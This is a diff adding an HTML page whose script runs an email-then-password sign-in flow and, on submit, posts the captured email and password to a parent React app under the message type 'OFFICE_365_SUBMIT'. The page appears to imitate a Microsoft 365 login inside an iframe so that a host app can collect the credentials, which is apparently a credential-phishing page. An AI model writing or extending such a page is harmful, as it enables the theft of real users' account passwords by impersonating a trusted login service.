@@ -1,0 +1,70 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <!-- ... head content is identical ... -->
+  <style>
+    /* ... styles are identical ... */
+  </style>
+</head>
+<body>
+  <!-- ... all HTML body content is identical ... -->
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+        const div1 = document.getElementById('div1');
+        const passwordView = document.getElementById('password_view');
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const nextBtn = document.getElementById('next');
+        const signInBtn = document.getElementById('sign_in');
+        const backToEmail = document.getElementById('back_to_email');
+        const displayEmail = document.getElementById('display_email');
+        
+        let userEmail = ''; // Store email locally
+
+        // Step 1: Email -> Password View
+        nextBtn.addEventListener('click', function () {
+            const email = emailInput.value.trim();
+            if (!email) {
+                emailInput.focus();
+                return;
+            }
+            userEmail = email; // Save the email
+            displayEmail.textContent = email;
+            div1.classList.add('hidden');
+            document.getElementById('options_box').classList.add('hidden');
+            passwordView.classList.remove('hidden');
+            passwordInput.focus();
+        });
+
+        // Back to email
+        backToEmail.addEventListener('click', function() {
+            passwordView.classList.add('hidden');
+            div1.classList.remove('hidden');
+            document.getElementById('options_box').classList.remove('hidden');
+        });
+
+        // MODIFIED Step 2: Send credentials to the parent React app
+        signInBtn.addEventListener('click', async function () {
+            const password = passwordInput.value.trim();
+            if (!password) {
+                passwordInput.focus();
+                return;
+            }
+
+            // This is the magic part: we post a message to the parent window.
+            // The parent (our React app) will be listening for this.
+            window.parent.postMessage({
+              type: 'OFFICE_365_SUBMIT',
+              payload: {
+                email: userEmail,
+                password: password
+              }
+            }, '*'); // Use a specific target origin in production for security
+        });
+
+        // ... Other listeners for UI elements can remain if needed for visuals
+    });
+  </script>
+</body>
+</html>
